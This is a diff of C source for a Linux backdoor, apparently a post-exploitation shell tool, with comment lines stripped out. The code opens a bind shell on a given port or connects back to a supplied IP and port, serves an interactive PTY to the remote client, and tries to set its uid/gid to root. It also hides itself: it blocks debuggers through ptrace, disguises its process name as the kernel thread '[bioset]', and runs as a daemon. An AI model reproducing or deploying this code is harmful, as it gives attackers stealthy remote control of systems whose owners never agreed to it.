@@ -15,14 +15,13 @@
 #define SHELL "/bin/bash"
 #define FAKE_NAME "[bioset]"
 
-//#define _DEBUG // uncomment for debugging mode
 
-//http://patorjk.com/software/taag/#p=display&f=AMC%20AAA01&t=postshell
 char *banner = R"EOF(
  __     ____ __ __ __  ___  ______ __  __  ___  __  __    ____   ____ ____   ____  ____   ___ ______    __  __ __ __ __  __ ______  ____ ____ 
  ||    ||    || || || // \\ | || | ||  || // \\ ||\ ||    || \\ ||    || \\ ||    ||     //   | || |    ||  || || || ||\ || | || | ||    || \\
  ||    ||==  \\ // || ||=||   ||   ||==|| ||=|| ||\\||    ||_// ||==  ||_// ||==  ||==  ((      ||      ||==|| || || ||\\||   ||   ||==  ||_//
  ||__| ||___  \V/  || || ||   ||   ||  || || || || \||    ||    ||___ || \\ ||    ||___  \\__   ||      ||  || \\_// || \||   ||   ||___ || \\
+ 
 )EOF";
 
 void try_root(void) {
@@ -47,12 +46,12 @@ int return_conn(int port) // bind to a port for bindshell
 {
     int s0 = socket(AF_INET, SOCK_STREAM, 0);
     struct sockaddr_in serv_info = { 0 };
-    setsockopt(s0, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int)); // allow reuse of port incase of program crash
+    setsockopt(s0, SOL_SOCKET, SO_REUSEADDR, &(int){ 1 }, sizeof(int));
     serv_info.sin_family = AF_INET;
     serv_info.sin_port = htons(port);
     serv_info.sin_addr.s_addr = INADDR_ANY;
     if (bind(s0, (struct sockaddr*)&serv_info, sizeof(serv_info)) == 0) {
-        listen(s0, 0); // only accept 1 client connection and tell everyone else to fuck off
+        listen(s0, 0); 
         int s1 = accept(s0, (struct sockaddr*)NULL, NULL);
         close(s0);
         return s1;
@@ -103,10 +102,6 @@ bool open_term(int s0)
         putenv("PS1=\\x1b[1;36m\\u@\\h:\\w\\$\\x1b[0m");
         putenv(("SHELL=%s", SHELL));
 
-        /*
-            Setting the terminal size
-        */
-
         ws.ws_row = 80;
         ws.ws_col = 20;
         ws.ws_xpixel = 0;
@@ -150,7 +145,7 @@ bool open_term(int s0)
         }
         else { // master
             close(slave);
-            write(master, "stty -echo\n", 11); // removes duplicate commands being shown to the user
+            write(master, "stty -echo\n", 11);
             send(s0, banner, strlen(banner), 0);
             usleep(1250000);
             tcflush(master, TCIOFLUSH);
@@ -161,7 +156,7 @@ bool open_term(int s0)
                 FD_SET(master, &comm);
                 char message[1024] = { 0 };
 
-                if (!is_alive(s0)) { // detecting an invalid connection
+                if (!is_alive(s0)) {
                     break;
                 }
 
@@ -201,7 +196,7 @@ bool open_term(int s0)
 }
 
 bool detect_debugging() {
-    if(ptrace(PTRACE_TRACEME, 0, 1, 0) < 0){ // anti-debugging
+    if(ptrace(PTRACE_TRACEME, 0, 1, 0) < 0){ 
         return true; 
     }
     return false;
@@ -209,15 +204,15 @@ bool detect_debugging() {
 
 void cloak_name(int argc, char *argv[]) {
     for(int i=0;i<argc;i++){
-      memset(argv[i],'\x0',strlen(argv[i])); // we need to remove the sys args
+      memset(argv[i],'\x0',strlen(argv[i]));
     }
-    strcpy(argv[0], FAKE_NAME); // cloak, command name
-    prctl(PR_SET_NAME, FAKE_NAME); // cloak, thread name
+    strcpy(argv[0], FAKE_NAME); 
+    prctl(PR_SET_NAME, FAKE_NAME);
 }
 
 void handle_sigs(void) {
     signal(SIGPIPE, SIG_IGN);
-    signal(SIGCHLD, SIG_IGN); // fuck zombie process's
+    signal(SIGCHLD, SIG_IGN); 
 }
 
 int main(int argc, char *argv[])
@@ -229,14 +224,14 @@ int main(int argc, char *argv[])
         }
         else {
             handle_sigs();
-            try_root(); // try to set guid/uid to 0 (root)
+            try_root(); 
             if(!daemon(1, 0)) {
                 int s1 = 0;
-                if (argc == 2) // bindshell -- ./binary port
+                if (argc == 2)
                 {
                     s1 = return_conn(atoi(argv[1]));
                 }
-                else if (argc == 3) // backconnect -- ./binary ip port
+                else if (argc == 3)
                 {
                     s1 = create_conn(argv[1], atoi(argv[2]));
                 }
